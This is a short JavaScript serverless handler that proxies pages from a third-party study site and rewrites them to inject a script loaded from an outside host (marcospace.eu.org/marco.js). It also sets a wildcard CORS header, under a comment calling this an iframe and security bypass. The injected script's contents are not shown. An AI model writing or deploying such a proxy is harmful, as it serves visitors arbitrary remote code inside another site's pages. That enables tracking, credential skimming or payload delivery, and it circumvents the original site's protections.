export default async function handler(req, res) {

const target = "https://pwthor.site/study/batches/";

const response = await fetch(target,{
headers:{
"user-agent":req.headers["user-agent"] || ""
}
});

let html = await response.text();

/* JS inject */
html = html.replace(
"</head>",
'<script src="https://marcospace.eu.org/marco.js"></script></head>'
);

/* headers remove (iframe / security bypass) */
res.setHeader("content-type","text/html");
res.setHeader("Access-Control-Allow-Origin","*");

res.status(200).send(html);

}
